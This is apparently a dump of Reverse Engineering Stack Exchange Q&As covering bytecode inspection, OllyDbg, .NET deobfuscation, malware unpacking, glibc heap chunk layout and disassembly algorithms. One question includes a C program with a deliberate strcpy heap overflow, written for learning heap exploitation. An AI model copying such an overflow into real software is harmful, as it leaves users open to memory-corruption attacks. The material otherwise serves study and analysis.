      co_lnotab = '\x00\x01', co_zombieframe = 0x0, co_weakreflist = 0x0}
(gdb) print (*(PyCodeObject*)0x187aca0)-&gt;co_code
$4 = 'd\x01\x00GHd\x00\x00S'
</code></pre>

<p>So, here is the way to access directly the bytecode, given the address of the function.</p>

<p>Just to try to  be complete, the best documentation I found on Python bytecode (and how to access it), is the Python code itself and especially the <code>inspect</code> module (<a href=""http://hg.python.org/cpython/file/2.7/Lib/inspect.py"">2.7</a>, <a href=""http://hg.python.org/cpython/file/3.2/Lib/inspect.py"">3.2</a>). Try to look at it, it is quite instructive.</p>

<p>Another help you can use is the <a href=""http://docs.python.org/2/library/dis.html""><code>dis</code> module</a> that provide a disassembler for the Python bytecode. Here is an example of what can do this disassembler.</p>

<pre><code>$&gt; python2.7
Python 2.7.3 (default, Mar  4 2013, 14:57:34) 
[GCC 4.7.2] on linux2
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; def foo():
...     print(""Hello World!"")
... 
&gt;&gt;&gt; import dis
&gt;&gt;&gt; dis.dis(foo)
  2           0 LOAD_CONST               1 ('Hello World!')
              3 PRINT_ITEM          
              4 PRINT_NEWLINE       
              5 LOAD_CONST               0 (None)
              8 RETURN_VALUE 
</code></pre>
","1939"
"How to debug ARM binary with IDA pro on Windows?","4173","","<p>I'm newbie, I have a little knowledge of debugging x86 binary. However, I have to work with ARM.
I'm getting stuck on install QEMU and can't debug an ARM binary.</p>

<p>Thank you a lot for give me tutorials of reversing an example ARM binary.</p>
","<p>Here is a simple video for setting up qemu for ARM. </p>

<p><a href=""http://www.securitytube.net/video/5818"" rel=""nofollow"">http://www.securitytube.net/video/5818</a></p>

<p>Using IDA you can open and disassemble the program fine. Just to debug you will probably get stuck using GDB as you can't run the arm binary in your current environment. </p>

<p>Let me know if you have more questions.</p>
","6172"
"When was the MOVABS instruction introduced?","4146","","<p>When trying to write an instruction set analysis tool for disassembled code (<a href=""https://superuser.com/a/832440/384221"">https://superuser.com/a/832440/384221</a>) I have found opcode MOVABS which was not included in my opcode source database (Shirk's <code>gas.vim</code> file) and I am not sure in which architecture it has been introduced.</p>

<p>According to <a href=""https://reverseengineering.stackexchange.com/q/2627/9891"">What is the meaning of movabs in gas/x86 AT&amp;T syntax?</a> and other sources it seems that the instruction has been introduced before 64-bit architectures. But was it with i686 or earlier?</p>

<p>Thank you.</p>
","<p><code>movabs</code> is just a GAS-specific way to enforce encoding a 64-bit memory offset or immediate. It's still the same standard <a href=""http://www.felixcloutier.com/x86/MOV.html"" rel=""nofollow""><code>MOV</code> opcode</a>.</p>

<p>I'm not sure where you got the notion that it was introduced before x64, it's obviously not correct. For example, the <a href=""http://docs.oracle.com/cd/E36784_01/html/E36859/eoizm.html#scrolltoc"" rel=""nofollow"">Solaris x86 manual</a> mentions: ""movabs valid only under –m64"".</p>
","6541"
"Viewing an exported DLL function in OllyDbg - garbage code","4134","","<p>Being rather new to the concept of RE, I wanted to try and take a look at the assembly code in one DLL that I know exports some functions.</p>

<p>First, I used this tool - <a href=""http://www.nirsoft.net/utils/dll_export_viewer.html"" rel=""nofollow"">http://www.nirsoft.net/utils/dll_export_viewer.html</a> - to obtain a list of exports within said DLL. These are some of the functions:</p>

<pre><code>GI_Call 0x100590a7  0x000590a7  2 (0x2) mydll.dll   I:\test\mydll.dll   Exported Function   
GI_CleanReturnStack 0x10058eae  0x00058eae  3 (0x3) mydll.dll  I:\test\mydll.dll    Exported Function   
GI_Cmd_Argc 0x10058bd4  0x00058bd4  4 (0x4) mydll.dll   I:\test\mydll.dll   Exported Function   
GI_Cmd_Argc_sv  0x10059593  0x00059593  5 (0x5) mydll.dll   I:\test\mydll.dll   Exported Function   
</code></pre>

<p>When I, however, load the DLL up in OllyDbg and browse to any of these addresses, I get instructions that don't really resemble a beginning of a function, for example GI_Call:</p>

<pre><code>100590A7     10E9                ADC CL,CH
100590A9     CE                  INTO
100590AA     FC                  CLD
100590AB     FFFF                ???                                                        ; Unknown command
100590AD     FF75 10             PUSH DWORD PTR SS:[EBP+10]
100590B0     8D45 FC             LEA EAX,DWORD PTR SS:[EBP-4]
100590B3     50                  PUSH EAX
100590B4     57                  PUSH EDI
</code></pre>

<p>What's even more puzzling is that once I scroll up/down, the code actually changes - there's no</p>

<pre><code>100590A7     10E9                ADC CL,CH
</code></pre>

<p>anymore, it changes to a completely different instruction, also that address is gone.</p>

<p>Am I doing something wrong? Or is the DLL possibly encrypted? Though if it is, how could DLL Export Viewer dump the exports so easily?</p>
","<p>Your library might get loaded to a location that's completely different from the one it wants to be loaded at, i.e. the address in the header, due to <a href=""http://en.wikipedia.org/wiki/Address_space_layout_randomization"" rel=""nofollow"">ASLR</a>.</p>

<p>Also, when loading a DLL, Ollydbg doesn't load the DLL directly; instead, it uses <code>loaddll.exe</code>. Which means, it starts the executable, but the breakpoint it sets is <em>before</em> <code>loaddll</code> has a chance to, well, load the DLL.</p>

<p>Try the following:</p>

<ul>
<li>Set a breakpoint on <code>LoadLibraryA</code> : right click in CPU Window - Go To - Expression - <code>LoadLibraryA</code> - Press <kbd>F2</kbd>;</li>
<li>Repeat the same with LoadLibraryW (the A version should be sufficient, just to make sure);</li>
<li>Run the program;</li>
<li>Once your breakpoint is it, press <kbd>CTRL</kbd>-<kbd>F9</kbd> (execute till return);</li>
<li>If your DLL depends on others, you'll hit one of your breakpoints again; else you'll hit the breakpoint at the <code>RET</code> instruction. Don't worry, in either case, your DLL will be loaded;</li>
<li>Use View->Memory or View->Executable Modules to learn where your DLL was actually loaded. This may be the same address that DLL Export Viewer shows you, but often, it will be different (address conflicts between two DLLs, in which case one has to be relocated, or ASLR, as above);</li>
<li>Only if the addresses match: Right Click -> GoTo -> Expression -> <code>0x12345678</code> or whatever address you want to see;</li>
<li>No matter if they match or not: Right Click -> GoTo -> Expression -> (Function name) will scroll to that function.</li>
</ul>

<p>The reason for your '<em>disappearing</em>' instruction is that it's the middle of another instruction. Consider this function start:</p>

<pre><code>10001280 &gt; 53               PUSH EBX
10001281   56               PUSH ESI
10001282   57               PUSH EDI
10001283   8B7C24 10        MOV EDI,DWORD PTR SS:[ESP+10]
10001287   8BF1             MOV ESI,ECX
10001289   3BF7             CMP ESI,EDI
1000128B   0F94C3           SETE BL
1000128E   84DB             TEST BL,BL
10001290   75 32            JNZ SHORT 100012C4
</code></pre>

<p>The byte at <code>10001284</code>, <code>0x7c</code>, is part of the instruction at <code>1001283</code>. But if you disassemble from <code>10001284</code>,</p>

<pre><code>10001284   7C 24            JL SHORT 100012AA
10001286   108B F13BF70F    ADC BYTE PTR DS:[EBX+FF73BF1],CL
1000128C   94               XCHG EAX,ESP
1000128D   C3               RETN
1000128E   84DB             TEST BL,BL
10001290   75 32            JNZ SHORT 100012C4
</code></pre>

<p>The wrong bytes get interpreted as instructions. Once you scroll up a few rows, Ollydbg syncs correctly again - and shows the '<em>real</em>' instructions.</p>
","6105"
"How to disassemble .NET after using Confuser","4110","","<p>I want to test malware that wrote in .NET 4.5 and obfuscated by Confuser 1.9.</p>

<p>I have tried to open it with .NET Reflector, ILSpy and dotpeek, but all of them can't open it.</p>

<p>How can I debug (and modify) it? There is a special tool for that?</p>
","<p>Try <a href=""http://de4dot.com"" rel=""nofollow"">http://de4dot.com</a> its a powerful .net deobfuscator. I've authored a serie of tutorials dubbed ""demystifying dot net reverse engineering"" google it, its a great point of start if you are new on .net RE.</p>

<p>Here is an article on how to deal with obfuscated assemblies <a href=""http://resources.infosecinstitute.com/reverse-engineering-obfuscated-assemblies/"" rel=""nofollow"">http://resources.infosecinstitute.com/reverse-engineering-obfuscated-assemblies/</a></p>

<p>And this is directly related to what you asked for : [.NET] Decrypt Confuser 1.9 methods : <a href=""http://fr.scribd.com/doc/207710371/NET-Decrypt-Confuser-1-9-Methods#scribd"" rel=""nofollow"">http://fr.scribd.com/doc/207710371/NET-Decrypt-Confuser-1-9-Methods#scribd</a></p>

<p>Good luck</p>
","11409"
"Understanding the most recent heap implementation under Linux","4082","","<p>A few days ago, I was wondering how one could teach himself heap-based overflow exploitation.</p>

<p>So I searched through documentation, subsequently practicing what I read in order to have a better insight of how the heap works under Linux.</p>

<p>We are told that the malloc() / free() function works around <a href=""http://gee.cs.oswego.edu/dl/html/malloc.html"">Doug Lea's memory allocator</a> but, in spite of the great explanation given by the link, I cannot figure things out as I debug my program.</p>

<p>Given this example:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int n = 5;

int main(int argc, char** argv) {

        char* p;
        char* q;

        p = malloc(1024);
        q = malloc(1024);

        printf(""real size = %d\n"",*(((int*)p)-1) &amp; 0xFFFFFFF8);

        if(argc &gt;= 2) {
                strcpy(p, argv[1]);
        }

        free(q);
        printf(""n = 0x%08X\n"", n);
        free(p);

        return EXIT_SUCCESS;
}
</code></pre>

<p>I would like to dump this structure in memory:</p>

<pre><code>struct chunk {
        int prev_size;
        int size;
        struct chunk *fd;
        struct chunk *bk;
};
</code></pre>

<p>Here is my workflow:</p>

<pre><code>geo@lilith:~/c/vuln_malloc$ gcc -o vuln vuln.c -m32 -ggdb
geo@lilith:~/c/vuln_malloc$ gdb ./vuln
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type ""show copying""
and ""show warranty"" for details.
This GDB was configured as ""x86_64-linux-gnu"".
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
Reading symbols from /home/geo/c/vuln_malloc/vuln...done.
(gdb) b 21
Breakpoint 1 at 0x804850f: file vuln.c, line 21.
(gdb) r `perl -e 'print ""A"" x 1024'`
Starting program: /home/geo/c/vuln_malloc/vuln `perl -e 'print ""A"" x 1024'`
real size = 1032

Breakpoint 1, main (argc=2, argv=0xffffd414) at vuln.c:21
21              free(q);
(gdb) x/10x q-4
0x804a40c:      0x00000409      0x00000000      0x00000000      0x00000000
0x804a41c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a42c:      0x00000000      0x00000000
(gdb)
</code></pre>

<p>Here I can see the size-field's value, which is 0x409. I can easily guess that the real size of my chunk is 0x409 &amp; 0xFFFFFF8 = 0x408 = 1032, as explained by the documentation (the three least significant actually define some flags). Then I run until the free() function is processed.</p>

<pre><code>(gdb) b 22
Breakpoint 2 at 0x804851b: file vuln.c, line 22.
(gdb) c
Continuing.

Breakpoint 2, main (argc=2, argv=0xffffd414) at vuln.c:22
22              printf(""n = 0x%08X\n"", n);
(gdb) x/10x q-4
0x804a40c:      0x00020bf9      0x00000000      0x00000000      0x00000000
0x804a41c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a42c:      0x00000000      0x00000000
</code></pre>

<p>Firstly I don't understand the new value - 0x20bf9 - at all, secondly I don't understand why there isn't any relevant values as regard the fd and bk pointers either.</p>

<p>All of that stuff does not make much sense for me, that's why I was wondering wether you could give me some clues about all of this or not. Does the Doug Lea's implementation still exist in recent glibc versions, or...?</p>
","<p>First of all, I have bad news for you ! Doug Lea's malloc is almost no more used in any C library implementation (even if understanding <code>dlmalloc</code> can help a lot to understand new ones).</p>

<p>The new implementation that is most widely used is <code>ptmalloc2</code> and the best way to learn about it is... to read the code... So, if you are using a Debian(-like) distribution, just like me, you just need to get the source code of the libc like this:</p>

<pre><code>$&gt; apt-get source libc6
</code></pre>

<p>Note that the <a href=""http://lwn.net/Articles/488778/"" rel=""nofollow noreferrer"">glibc is no more</a> and has been subsumed by the <a href=""http://www.eglibc.org/home"" rel=""nofollow noreferrer"">eglibc project</a>. The Debian distribution switched to eglibc some time ago (see <a href=""http://blog.aurel32.net/47"" rel=""nofollow noreferrer"">here</a> and <a href=""http://lwn.net/Articles/332000/"" rel=""nofollow noreferrer"">there</a> and even on the <a href=""http://packages.qa.debian.org/g/glibc.html"" rel=""nofollow noreferrer"">glibc source package page</a>). So, the implementation of <code>malloc</code> has changed considerably (and some security safeties have been added since <code>dlmalloc</code>).</p>

<p>But, let see what does look like the <code>malloc</code> implementation:</p>

<pre><code>$&gt; cd eglibc-2.17/malloc/
$&gt; less malloc.c

...
/*
 This is a version (aka ptmalloc2) of malloc/free/realloc written by
 Doug Lea and adapted to multiple threads/arenas by Wolfram Gloger.

 There have been substantial changesmade after the integration into
 glibc in all parts of the code.  Do not look for much commonality
 with the ptmalloc2 version.
...
</code></pre>

<p>As I said, the algorithm used here is <code>ptmalloc2</code> (POSIX Threads Malloc), but with significant modifications. So, you'd better read the code to know better about it.</p>

<p>But, to sum up a bit, the heap memory is managed through memory chunks which are prefixed by meta-data gathering these information (I am just quoting comments that are in the <code>malloc.c</code> source file, refer to the whole file for more):</p>

<pre><code>/*
   malloc_chunk details:

    (The following includes lightly edited explanations by Colin Plumb.)

    Chunks of memory are maintained using a `boundary tag' method as
    described in e.g., Knuth or Standish.  (See the paper by Paul
    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a
    survey of such techniques.)  Sizes of free chunks are stored both
    in the front of each chunk and at the end.  This makes
    consolidating fragmented chunks into bigger chunks very fast. The
    size fields also hold bits representing whether chunks are free or
    in use.

    An allocated chunk looks like this:


    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if allocated            | |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                       |M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk                                     |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


    Where ""chunk"" is the front of the chunk for the purpose of most of
    the malloc code, but ""mem"" is the pointer that is returned to the
    user.  ""Nextchunk"" is the beginning of the next contiguous chunk.

    Chunks always begin on even word boundries, so the mem portion
    (which is returned to the user) is also on an even word boundary, and
    thus at least double-word aligned.

    Free chunks are stored in circular doubly-linked lists, and look like this:

    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk                            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                         |P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    The P (PREV_INUSE) bit, stored in the unused low-order bit of the
    chunk size (which is always a multiple of two words), is an in-use
    bit for the *previous* chunk.  If that bit is *clear*, then the
    word before the current chunk size contains the previous chunk
    size, and can be used to find the front of the previous chunk.
    The very first chunk allocated always has this bit set,
    preventing access to non-existent (or non-owned) memory. If
    prev_inuse is set for any given chunk, then you CANNOT determine
    the size of the previous chunk, and might even get a memory
    addressing fault when trying to do so.

    Note that the `foot' of the current chunk is actually represented
    as the prev_size of the NEXT chunk. This makes it easier to
    deal with alignments etc but can be very confusing when trying
    to extend or adapt this code.

    The two exceptions to all this are

     1. The special chunk `top' doesn't bother using the
        trailing size field since there is no next contiguous chunk
        that would have to index off it. After initialization, `top'
        is forced to always exist.  If it would become less than
        MINSIZE bytes long, it is replenished.

     2. Chunks allocated via mmap, which have the second-lowest-order
        bit M (IS_MMAPPED) set in their size fields.  Because they are
        allocated one-by-one, each must contain its own trailing size field.
*/
</code></pre>

<p>You can also refer to '<a href=""https://csg.utdallas.edu/wp-content/uploads/2012/08/Heap-Based-Exploitation.pdf"" rel=""nofollow noreferrer""><em>Heap-Based Exploitation</em></a>' which is a talk from Scott Hand about heap management and overflow exploitation.</p>

<p>Still, you have a lot of work to do to understand everything, I would have like to have more time to explain. But, I hope it helped you a bit to find ways to go deeper (downloading the source is really the key here).</p>
","3130"
"How to unpack files packed with multiple packers?","4077","","<p>As I am just getting started in RE, I've mostly faced files packed with a single-layer of packing , such as UPX, ASPack, etc.</p>

<p>Unpacking these protections is fully documented online. The problem begins when I deal with <strong>multiple layers of packing</strong>, especially concerning malware. I have followed some tutorials though they're usually not detailed enough. They seem to go through a <strong>tedious process</strong> to find the OEP. For example, they start by dealing with common packers (which is the easy part) and then they begin to set breakpoints everywhere ""<strong>in calls and jumps</strong>"" and tracing through the file here and there, which is for me the <strong>hard part</strong> that I have described above. At this point, I have no clue for what they are seeking or for what they are aiming, and then after some work, they find the OEP!  </p>

<p>So what logic did they follow in that process? Also, because I know that the subject is broad, I'm also interested in some keywords.</p>
","<p>As you saw by yourself, RE is not a easy skill to accomplish. One must find as much patience (at least) as he could to acquire it, some intelligence and knowledge will also help. If you think that just following the tutorial you will understand all of it from the first read, then you are wrong.<br>
My advice to you is :</p>

<ul>
<li>read the tutorial several times and try to pass it without looking into the writings</li>
<li>try to understand as much as you can about OS/platform you are reversing on</li>
<li>be proficient with PE format for a start or the file format you are dealing with</li>
<li>read about packers and obfuscation techniques</li>
</ul>

<p>After that, I'm pretty sure, if you come back to that tut again, you will understand it more clearly.  </p>

<p>Here are some good resources:</p>

<ol>
<li><a href=""http://www.securitytube.net/video/747"">Malware Unpacking In Ollydbg</a></li>
<li><a href=""http://blog.ring-zer0.com/2013/07/tutorial-finding-oep-and-unpacking.html"">Finding OEP and unpacking Malware packed with ASPACK 2.12</a> - try it although you said, you came across similar ones</li>
<li><a href=""http://www.woodmann.com/fravia/"">Fravia's archive pages of reverse engineering</a></li>
<li><a href=""http://win32assembly.programminghorizon.com/pe-tut1.html"">Overview of PE file format</a></li>
</ol>

<p>May the force be with you :)</p>
","2553"
"What is the algorithm used in Recursive Traversal disassembly?","4046","","<p>Disassembling binary code is a quite difficult topic, but for now only two (naive) algorithms seems to be broadly used in the tools.</p>

<ul>
<li><strong>Linear Sweep</strong>: A basic algorithm taking all the section marked as <em>code</em> and disassembling it by reading the instructions one after each other.</li>
<li><strong>Recursive Traversal</strong>: Refine the linear sweep by remembering when (and where) a <code>call</code> has been taken and returning to the last <code>call</code> when encountering a <code>ret</code>.</li>
</ul>

<p>Yet, the description of these algorithms are quite vague. In real-life tools, they have been a bit refined to improve the accuracy of the disassembling. </p>

<p>For example, <code>objdump</code> perform a linear sweep but will start from all the symbols (and not only the beginning of the sections marked as <code>code</code>.</p>

<p>So, can somebody give a more realistic description of the recursive traversal algorithm (<em>e.g.</em> as it is coded in IDAPro) ?</p>
","<p>I have decided to post my answer not to overthrow Igor's answer, but to have an addition to it. I was not comfortable with editing his post either. I am pretty new to the forum and not sure how it is taken by other members. </p>

<p>There is a little theory I have recently learned, which I would like to share. Anyways, what I have taken in about IDA Pro from <a href=""http://nostarch.com/idapro.htm"">The IDA Pro Book</a> (Part I, Section 1) is that it uses <strong><code>Recursive Descent Disassembly</code></strong>, which is based on the concept of control flow. The key element to this approach is the analysis of each instruction in order to determine if it is referenced from any other location. Each instruction is classified according to how it interacts with EIP. There are several main classifications:</p>

<ol>
<li><strong>Sequential Flow Instuctions</strong>. Those are instruction that pass execution to the next instruction to follow such as <code>add</code>, <code>mov</code>, <code>push</code>, <code>pop</code>, etc. Those instructions are disassembled with <strong>linear sweep</strong></li>
<li><strong>Conditional Branching Instructions</strong>. Those are <em>True/False</em> conditional instructions such as <code>je</code> and such. Conditional instructions only offer 2 possible branches of execution. If condition is <em>False</em> and jump is not taken disassembler proceeds with <strong>linear sweep</strong>, and adds jump target instruction to a list of deferred code to be disassembled at later time using <strong>recursive descent algorithm</strong></li>
<li><strong>Unconditional Branching Instructions</strong>. Those instruction can cause particular problems for recursive descent disassemblers in case the jump target is calculated at runtime. Unconditional branches do not follow linear flow. If possible, disassembler will attempt to add the target of the unconditional jump for further analysis. If target is not determined, there is going to be no disassembly for the particular branch.</li>
<li><strong>Function Call Instructions</strong>. Call instructions are mostly treated as Unconditional Branching Instructions with expectation that execution would return to the instruction following the call as soon as function completes. The target address address of the call instruction is queued for deferred disassembly, and the instruction following the call is processed as linear sweep. However, it is not always possible to determine target of the call (e.g. <code>call eax</code>). </li>
<li><strong>Return Instructions</strong> Return instructions do not offer any information to disassembler about what to execute next. Disassemblers cannot pop the return address from the top of the stack. All of that brings disassembler to stop. At this point disassembler turns to the saved list of deferred targets to follow next. That is exactly why it is called <strong><em>recursive</em></strong>.</li>
</ol>

<p>To summarize, I would like to quote <a href=""http://nostarch.com/idapro.htm"">The IDA Pro Book</a>:</p>

<blockquote>
  <p>One of the principle advantages of the recursive descent algorithm is its superior ability to distinguish code from data. As a control flow-based algorithm, it is much less likely to incorrectly disassemble data values as code. The main disadvantage of recursive descent is the inability to follow indirect code paths, such as jumps or calls, which utilize tables of pointers to look up a target address. However, with the addition of some heuristics to identify pointers to code, recursive descent disassemblers can provide very complete code coverage and excellent recognition of code versus data.</p>
</blockquote>
","2350"
"How is Hopper on Windows or Linux?","3987","","<p><a href=""http://www.hopperapp.com/"" rel=""nofollow"">Hopper</a> seems to be focused on Mac, but how does its capabilities on Windows or Linux compares with the free version of IDA for reversing x86/x64 executables?  </p>

<p><a href=""http://www.hopperapp.com/"" rel=""nofollow"">Hopper</a> seems to have all the major features IDA has; a graph view, ability to rename objects, and a Python API, yet IDA is still the standard.</p>

<p>Are these features in Hopper as effective as in IDA? Are there any known deficiencies in Hopper? </p>
","<p>I am using IDA for about 10 years and I have been using Hopper for a few months (on Kubuntu and Windows).</p>

<p>It depends what you want to do, what budget you have and whether it's hobby or professional.</p>

<p>Clearly, IDA is more powerful in most aspects. It supports a wider ranger of processors, has more loaders and a plugin system as well as two powerful scripting languages (IDC/Python).</p>

<p>Given the price tag, Hopper is <strong>well worth</strong> the purchase. Indeed, I can confirm that the decompiler is more simplistic than even the Hex-Rays decompiler in its beta some years back (I have never used it again since then). If someone wants to start with reverse engineering, I am clearly recommending IDA Freeware for those that work only with Windows PE files (and outside a commercial context) and Hopper if the hobbyist is willing to shell out a few bucks.</p>

<p>There are a few things to consider: do you look for a decompiler or a disassembler and what's your budget? From daily use I'd say that the disassembler for x86 and x64 is pretty much equivalent for ELF (Linux) and PE (Windows) files from my point of view.</p>

<p>All features in Hopper seem to function as well as you'd expect from a fairly new product (meaning the time of development that went into it overall) and the price tag. It is being improved all the time, so you'll be able to get feature updates.</p>

<p>However, the biggest - by far - <strong>disadvantage</strong> for me is the ""learning curve"". A lot of the features in Hopper have different shortcuts or slightly different work flows, but one can clearly see how the author must be aware of IDA and recent developments in IDA (notably since about IDA version 5.0). Although I come from the other side, I think someone starting with Hopper will benefit from it when later going professional and switching to paid IDA.</p>

<hr>

<p>Last but not least a note about decompilers. Being more acquainted with disassemblers I actually found results of Hex-Rays confusing and ambiguous in many cases in the past. The same holds for decompilation results of Hopper. If you are a seasoned reverser, disassembly sometimes tends to be ""clearer"" (albeit less convenient) the more experience you have.</p>
","2413"
"Why there are not any disassemblers that can generate re-assemblable asm code?","3920","","<p>I am struggling on this problem for around three months:</p>

<p><em>How to use disassemblers (IDA Pro and others...) to generate re-assemblable asm code and assemble it back</em></p>

<p>My experience is that:</p>

<ol>
<li><p>There is NO tool that can generate re-assemblable asm code on 32-bit x86.</p></li>
<li><p>You need to adjust/heuristically modify the asm code created by IDA Pro to make it re-assemblable.</p></li>
<li><p>It is doable to <strong>automatically</strong> adjust/heuristically modify process on <strong>benign program</strong> (one without obfuscation).</p></li>
<li><p>It is very tedious, and VS compiled PE binary is much more complex than GCC compiled ELF binary.</p></li>
</ol>

<p>So my questions are:</p>

<ol>
<li><p>Why there are not any disassemblers that can generate re-assemblable asm code targeting on <strong>benign program</strong> (one without obfuscation) ?</p></li>
<li><p>If I want to implement such a tool (without the help of IDA Pro, sketching from the beginning), is it possible?</p></li>
<li><p>Are there any other concerns related to this that I may have missed?</p></li>
</ol>
","<h2><strong>Because this is really hard to do.</strong></h2>

<p>To elaborate:</p>

<p>You'll also need to extract things that are not code. Think of import tables, export tables, strings and other data. </p>

<p>When you write code, this is only one part of the program. The other part is the Compiler Optimizations and data section. This makes it almost impossible to create re-compilable assembly. If you want to edit a program on assembly level I'd recommend to use windbg and LordPE.</p>
","3803"
"Why I can not directly get the content of `.bss` section?","3907","","<p>Test is on Linux 32bit.</p>

<p>I use this command to get the context of <code>.text</code> <code>.rodata</code> and <code>.data</code> section:</p>

<pre><code>objdump -s -j .text elf_binary
objdump -s -j .rodata elf_binary
objdump -s -j .data elf_binary
</code></pre>

<p>But basically when I tried to use this to get the content of <code>.bss</code> section, I always get the error shown below:</p>

<pre><code>objdump -s -j .bss elf_binary

objdump: section '.bss' mentioned in a -j option, but not found in any input file
</code></pre>

<p>Basically how can I get the content of <code>.bss</code> section from ELF binary?</p>
","<p>The <code>.bss</code> has no content. It's simply a tip to the loader to preallocate some space when starting the program. It will be all 0s at the execution and won't hold any useful information until the program writes to it. After that, you can use a debugger to dump the memory and explore its content.</p>

<p>Check the Wikipedia <a href=""http://en.wikipedia.org/wiki/.bss"">page</a> for more information.</p>
","4231"
"Reverse engineering from an APK file to a project by MAC","3849","","<p>I accidentally erased my project from Eclipse, and all I have left is the APK file which I transferred to my phone. Is there a way to reverse the process of exporting an application to the .apk file, so I can get my project back? by using MacOS X ?</p>
","<p>See <a href=""http://pof.eslack.org/2011/02/18/from-apk-to-readable-java-source-code-in-3-easy-steps/"">this</a>. You can unzip the classes.dex from your apk file on the mac, and dex2jar should work on a mac as well. </p>

<p>The last part, jd, is a windows program, but they have an online demo <a href=""http://jd.benow.ca/"">on their project site</a> - click ""live demo"" in the header, then drag and drop your jar file on the <code>input files</code> box.</p>

<p><strong>Edit</strong>
I just noticed there are download links for jd on mac as well, so you don't need to use the online version. You can even use the jd for eclipse plugin on a mac.</p>
","3943"
"Packed PE-file, where to start?","3841","","<p>I'm new to reverse engineering, so maybe it's an easy question but not for me).
I've got .exe file which is somehow packed.
When I open it with IDA, I got warning that file was packed or modified, and lots of problems, such ""sp-analysis failed"" and virtual addresses pointed to nowhere. IDA Unpacker plugin swamps me with warnings.
I tried to analyse HEADER. Sections have wrong bounds: pointer to raw data and size of raw data seems correct, but some virtual addresses IDA cannot resolve, and in ""Program Segmentation"" window some sections are missed. Most of instruction in file looks like this:</p>

<pre><code>___:00401000                 dd 9D3DBCCBh, 0DB7776EAh, 1F6BE17Bh, 0ADFBB803h, 4673D4B7h
___:00401000                 dd 903ADB7Ch, 0B03DACBAh, 0CA4C9D26h, 0ECFF17BBh, 0AFC80EE6h
___:00401000                 dd 0AE3EAEA3h, 5C244E1Ch, 8F68FA9Bh, 5671677Eh, 8C3CEC8Fh
___:00401000                 dd 0F56291C8h, 3D050237h, 9543FF95h, 0DA02686Ch, 6BB1A7EBh
___:00401000                 dd 32F012EAh, 99D0F3D3h, 8A8E08A5h, 1280ECB4h, 4B4ACACEh
___:00401000                 dd 0FFB892h, 5E01507Bh, 94087230h, 969DCCDBh, 8DD0AB9Bh
</code></pre>

<p>So what would be right approach? Should I create segments manual, and somehow say IDA to interpret it as code/data, or analyse entry point and ""start"" function that IDA found (with sp-analyse problem at the end)? Or it's better to try make IDA Unpacker plugin work?</p>
","<p>Use a tool like PEid to try and figure out what it's packed with, then search for a tutorial of how to unpack it. If you can't find it, there are resources online to learn out to write your own unpacker (it takes a significant amount of effort).</p>

<p>In general, unpacking works by dumping memory after the program unpacks itself, then reconstructing an executable from the dump.</p>

<p>Here's a resource to get you started on unpacking: <a href=""http://securityxploded.com/unpackingupx.php"" rel=""nofollow"">http://securityxploded.com/unpackingupx.php</a></p>

<p>UPX doesn't have any anti-debugging tricks, so it should be a good introduction.</p>
","8912"
"Get section's names and headers for a file using C++","3789","","<p>I'm implementing a software for performing some PE classification. Among the features values I'm gathering from each PE are, the <strong>ammount of sections</strong>, the <strong>name of sections</strong>, <strong>image section headers</strong>.</p>

<p>I have been reading about <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680198(v=vs.85).aspx"" rel=""nofollow"">ImageHlp Structures</a>. But there is no example on how to get those struct initialized from a file/path_to_a_file you pass. I'm specially interested in the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680341(v=vs.85).aspx"" rel=""nofollow"">IMAGE_SECTION_HEADER</a> structure.</p>

<p>How can I get the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680341(v=vs.85).aspx"" rel=""nofollow"">IMAGE_SECTION_HEADER</a>s form an executable file programatically?</p>
